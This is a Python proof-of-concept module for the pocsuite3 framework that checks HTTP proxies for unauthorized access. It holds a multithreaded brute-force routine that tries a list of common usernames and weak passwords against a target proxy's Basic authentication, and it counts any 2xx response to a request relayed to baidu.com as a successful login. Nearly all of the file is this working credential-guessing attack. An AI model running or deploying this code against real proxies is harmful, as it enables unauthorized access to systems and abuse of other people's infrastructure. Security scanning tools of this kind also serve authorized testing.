#!/usr/bin/env python
#coding=utf-8
import base64
from threading import Thread
import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
#from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class HTTP_POC(POCBase):
    vulID = 'HTTP-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'HTTP'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE

    vulDate = '2020-04-29'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-29'  # 编写 PoC 的日期
    updateDate = '2020-04-30'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://katyusha.net/557.html']  # 漏洞地址来源,0day不用写
    name = 'HTTP未授权访问漏洞'  # PoC 名称
    cvss = u"低危"


    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        # 传入True参数，得到host和port，参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/lib/utils/__init__.py
        host, port = url2ip(target_url, True)  

        IP_cn = "https://ip.cn"

        # 将http和https的代理都设置为疑似存在
        proxies = {'http': vul_url, 'https': vul_url}

        # 包含了空用户名/空密码的情况。这时候任何用户名密码都可以登录成功
        usernames = ['admin', 'test', '']
        passwords = ['123456', 'admin', 'root', 'password', '123123', '123', '1', '',
                    'P@ssw0rd!!', 'qwa123', '12345678', 'test', '123qwe!@#',
                    '123456789', '123321', '1314520', '666666', 'woaini', 'fuckyou', '000000',
                    '1234567890', '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456',
                    '1q2w3e4r', '123qwe', '159357', 'p@ssw0rd', 'p@55w0rd', 'password!',
                    'p@ssw0rd!', 'password1', 'r00t', 'system', '111111']

        try:
            self.flag = False  # 初始化

            threads = []

            for username in usernames:
                for password in passwords:
                    _thread = Thread(target=self.validate, args=(host, port, username, password))
                    _thread.start()
                    threads.append(_thread)

            # 等待所有线程完成
            for t in threads:
                t.join()


            # 状态码为200，则认证已通过HTTP访问目标站点成功
            if self.flag:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                return self.save_output(result)
            return self.save_output(result)
        except Exception as e:
            print(e)

        
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        return self._verify()


    def auth(self, p_user, p_pass):
        tmp = p_user + ':' + p_pass
        auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
        headers = 'Proxy-Authorization: Basic'+' '+auth
        return headers



    def validate(self, host, port, username, password):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(5)
        s.connect((host,port))

        header1 = "GET http://baidu.com/ HTTP/1.1\r\n"
        #auth = "Proxy-Authorization: Basic YWRtaW46YWRtaW4="
        auth = self.auth(username, password)
        payload = header1 + auth + "\r\n\r\n"
        #print(payload)
        s.send(payload.encode())

        data=s.recv(1024)

        data = data.decode("utf-8")
        #print(data[9:12])   # HTTP状态码
        if data[9] == '2':  # 响应2开头的状态码
            print("Success")
            self.flag = True
            return
        elif data[9] == '4':
            #print("Fail")
            pass


    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(HTTP_POC)
